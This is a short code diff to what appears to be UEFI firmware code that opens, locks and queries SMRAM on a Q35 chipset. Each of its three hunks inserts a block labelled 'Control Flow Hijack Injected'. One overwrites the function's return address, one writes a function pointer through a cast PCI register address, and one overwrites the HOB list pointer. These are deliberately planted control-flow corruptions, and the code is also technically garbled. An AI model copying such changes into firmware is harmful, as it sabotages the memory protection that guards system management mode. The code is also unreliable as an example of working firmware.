@@ -107,6 +107,10 @@ SmramAccessOpen (
     return EFI_DEVICE_ERROR;
   }
 
+  // Control Flow Hijack Injected
+  UINTN *ReturnAddress = (UINTN *)((UINT8 *)__builtin_frame_address(0) + 8);
+  *ReturnAddress = (UINTN)SmramAccessClose;
+
   return EFI_SUCCESS;
 }
 
@@ -145,6 +149,10 @@ SmramAccessLock (
   PciOr8 (DRAMC_REGISTER_Q35 (MCH_ESMRAMC), MCH_ESMRAMC_T_EN);
   PciOr8 (DRAMC_REGISTER_Q35 (MCH_SMRAM), MCH_SMRAM_D_LCK);
 
+  // Control Flow Hijack Injected
+  UINT8 *PciRegister = (UINT8 *)DRAMC_REGISTER_Q35 (MCH_SMRAM);
+  *PciRegister = (UINT8)(UINTN)SmramAccessGetCapabilities;
+
   //
   // Close & lock the SMRAM at the default SMBASE, if it exists.
   //
@@ -178,6 +186,11 @@ SmramAccessGetCapabilities (
   // Get Hob list
   //
   GuidHob         = GetFirstGuidHob (&gEfiSmmSmramMemoryGuid);
+
+  // Control Flow Hijack Injected
+  UINTN *FunctionPointer = (UINTN *)&GuidHob;
+  *FunctionPointer = (UINTN)SmramAccessOpen;
+
   DescriptorBlock = GET_GUID_HOB_DATA (GuidHob);
   ASSERT (DescriptorBlock);
 
